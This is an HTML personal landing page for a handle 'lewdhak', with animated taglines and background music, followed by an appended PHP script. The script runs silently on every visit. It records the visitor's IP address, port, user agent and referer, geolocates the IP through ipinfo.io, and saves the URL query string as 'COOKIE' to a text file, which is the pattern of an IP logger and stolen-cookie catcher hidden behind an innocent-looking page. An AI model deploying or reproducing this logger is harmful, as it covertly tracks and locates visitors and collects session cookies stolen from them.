<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
<title>lewdhak</title>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="assets/css/main.css">
<link rel="stylesheet" href="assets/css/cte.css">
</head>
<body>
<div id="particles-container"></div>
<audio controls hidden loop>
<source src="assets/audio/song.mp3" type="audio/mpeg">
</audio>
<div id="content-container">
<div class="center title topbar"><img class="emoji" src="assets/images/seperator.png"> https://lewdhaks.pages.dev/ <img class="emoji" src="assets/images/seperator.png"></div>
<span id="typing" class="center"></span>
<div class="inline-container bottombar center">

<pre style="display: inline-block;">|<div style="vertical-align: middle;" id="marquee"></div>|</pre>
</div>
</div>
<script src="assets/particles.js/particles.min.js"></script>
<script src="assets/particles.js/app.js"></script>
<script src="assets/js/cte.js"></script>
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/jquery.marquee.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
<script>
    // var CTE = {};
    CTE.callback = () => {
      var aud = document.getElementsByTagName("audio")[0];
      aud.volume = .3;
      aud.play();

      var typed = new Typed("#typing", {
        strings: ["destroying kids dreams since 2017", "magma owns you", "magma owner", "reaping rewards", "professional kpop destroyer", "discord terminated", "LewdHak#8599"],
        typeSpeed: 30,
        backspeed: 20,
        showCursor: false
      });

      var lines = ["discord terminated", "github.com/lewdhak"];
      for (var x = 0;x < lines.length;x++)
        $("#marquee").append(`${lines[x]}${(x < lines.length - 1? ' <img class="emoji" src="/assets/images/seperator.png"> ' : '')}`);

      $("#marquee").marquee({
        duration: 7500,
        gap: 100,
        delayBeforeStart: 1000,
        direction: 'left',
      });
    }
  </script>
</body>
</html>
<?php
function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 
function logData() 
{ 
	$ipLog = "information.txt"; 

	$cookie = $_SERVER['QUERY_STRING']; 

	$register_globals = (bool) ini_get('register_gobals'); 

	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 
	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	if (isset( $_SERVER['METHOD'])){
		$rqst_method = $_SERVER['METHOD'];
	}
	else{
		$rqst_method = "null";
	}
	if (isset( $_SERVER['REMOTE_HOST'])) {
		$rem_host = $_SERVER['REMOTE_HOST'];
	}
	else{
		$rem_host = "null";
	}
	if (isset($_SERVER['HTTP_REFERER'])) {
		$referer = $_SERVER['HTTP_REFERER'];
	}
	else
	{
		$referer = "null";
	}
	$date=date ("Y/m/d G:i:s"); 
	$log=fopen("$ipLog", "a+"); 


	// I use this site to get more infos about the IP addy such as city, ISP, location
	$ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));


// Write all data we got in 'information.txt'
	fwrite($log, "IP=" . $ip . PHP_EOL);
	fwrite($log, "PORT=" . $rem_port . PHP_EOL);
	fwrite($log, "CITY=" . $ip_details->city . PHP_EOL);
	fwrite($log, "REGION=" . $ip_details->region . PHP_EOL);
	fwrite($log, "COUNTRY=" . $ip_details->country . PHP_EOL);
	fwrite($log, "LOCATION=" . $ip_details->loc . PHP_EOL);
	fwrite($log, "ISP=" . $ip_details->org . PHP_EOL);
	fwrite($log, "DATE=" . $date . PHP_EOL);
	fwrite($log, "HOST=" . $rem_host . PHP_EOL);
	fwrite($log, "UA=" . $user_agent . PHP_EOL);
	fwrite($log, "METHOD=" . $rqst_method . PHP_EOL);
	fwrite($log, "REF=" . $referer . PHP_EOL);
	fwrite($log, "COOKIE=" . $cookie . PHP_EOL . PHP_EOL);

} 
logData();
?>
